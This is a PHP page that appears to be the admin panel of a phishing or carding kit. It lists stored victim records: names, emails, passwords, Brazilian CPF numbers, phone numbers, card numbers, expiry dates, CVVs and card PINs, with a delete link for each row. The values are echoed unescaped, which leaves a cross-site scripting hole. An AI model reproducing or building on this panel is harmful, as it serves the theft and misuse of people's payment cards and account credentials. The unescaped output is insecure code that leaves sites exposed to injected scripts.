<?php
include "../config/config.php";

global $pdo;
$array=[];
$sql=$pdo->prepare("SELECT * FROM coderphp_cliente");
$sql->execute();

if($sql->rowCount() > 0){
  $array = $sql->fetchAll();
}


?>

<div class="content " >

  <table class="table table-dark">
    <thead>
      <tr>
        <th scope="row">#ID</th>
        <td>Nome</td>
        <td>Email</td>
        <td>Senha</td>

        <td>Cpf</td>


        <td>Telefone</td>
        <td>Cep</td>
        <td>Titular</td>
        <td>Cpf titular</td>
        <td>Card</td>
        <td>Validade</td>
        <td>Cvv</td>
        <td>Senha card</td>
        <td>Ações</td>

      </tr>


    </thead>
    <tbody>


      <?php 
      foreach($array as $cc):
        ?>
        <tr>
          <th scope="col"><?= $cc['id'] ?></th>
          <th scope="col"><?= $cc['nomecompleto'] ?> </th>
          <th scope="col"><?= $cc['email'] ?></th>
          <th scope="col"><?= $cc['senha'] ?></th>
          <th scope="col"><?= $cc['cpf'] ?></th>


          <th scope="col"><?= $cc['telefone'] ?></th>
          <th scope="col"><?= $cc['cep'] ?></th>
          <th scope="col"><?= $cc['nome'] ?></th>
          <th scope="col"><?= $cc['cpfcc'] ?></th>
          <th scope="col"><?= $cc['cc'] ?></th>
          <th scope="col"><?= $cc['mes'] ?>/ <?= $cc['ano'] ?></th>
          <th scope="col"><?= $cc['cvv'] ?></th>
          <th scope="col"><?= $cc['senhacard'] ?></th>
          <th scope="col"><a  style="color:rgb(25, 181, 83);font-size:18px;text-decoration: none;" ><i  class="fa-brands fa-whatsapp"></i> </a>   <a href="del&id=<?=  $cc['id'] ?>" style="color:rgb(234, 62, 53);text-decoration: none;font-size:18px;" href="#"><i class="fa-solid fa-trash"></i> </a></th>
          
         


        </tr>

      <?php endforeach; ?>

    </tbody>
  </table>




</div>







</form>
</div>
</div>
</div>
</div>


<script type="text/javascript">
  $(function () {
    $('[data-toggle="tooltip"]').tooltip()
  })
</script>


</div>
</div>
</div>
</div>

</div>






</div>
</div>











</div>



</div>


</div>
</div>

</div>